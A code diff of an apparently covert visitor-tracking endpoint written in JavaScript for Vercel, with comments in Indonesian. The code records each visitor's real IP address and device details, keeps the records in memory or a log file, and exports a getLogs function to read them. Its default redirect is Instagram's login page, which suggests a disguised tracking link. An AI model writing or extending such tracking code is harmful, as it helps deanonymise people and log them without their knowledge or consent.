@@ -6,6 +6,9 @@ const path = require('path');
 const LOG_FILE = path.join(process.cwd(), 'tracker_logs.txt');
 const REDIRECT_URL = process.env.REDIRECT_URL || 'https://www.instagram.com/accounts/login/';
 
+// In-memory logs untuk demo di Vercel
+let inMemoryLogs = [];
+
 // Fungsi untuk mendapatkan IP sebenarnya
 function getClientIP(req) {
   return req.headers['x-forwarded-for'] || 
@@ -67,16 +70,36 @@ function getDeviceInfo(userAgent) {
 // Fungsi untuk menyimpan log
 async function saveLog(data) {
   try {
-    const logData = JSON.stringify(data);
-    const logEntry = `${new Date().toISOString()} | ${logData}\n`;
+    console.log('Saving log:', data);
     
-    await fs.appendFile(LOG_FILE, logEntry);
+    // Simpan ke memory
+    inMemoryLogs.push(data);
+    
+    // Jika di development, coba simpan ke file
+    if (process.env.NODE_ENV !== 'production') {
+      try {
+        const logData = JSON.stringify(data);
+        const logEntry = `${new Date().toISOString()} | ${logData}\n`;
+        
+        await fs.appendFile(LOG_FILE, logEntry);
+        console.log('Log saved to file');
+      } catch (error) {
+        console.error('Error saving log to file:', error);
+      }
+    }
   } catch (error) {
     console.error('Error saving log:', error);
   }
 }
 
+// Fungsi untuk mendapatkan logs (untuk diakses dari file lain)
+function getLogs() {
+  return inMemoryLogs;
+}
+
 module.exports = async (req, res) => {
+  console.log('API tracker called with method:', req.method);
+  
   // CORS headers
   res.setHeader('Access-Control-Allow-Credentials', true);
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -274,4 +297,7 @@ module.exports = async (req, res) => {
   // Set header dan kembalikan HTML
   res.setHeader('Content-Type', 'text/html');
   return res.status(200).send(html);
-}; 
+};
+
+// Ekspor fungsi getLogs
+module.exports.getLogs = getLogs; 
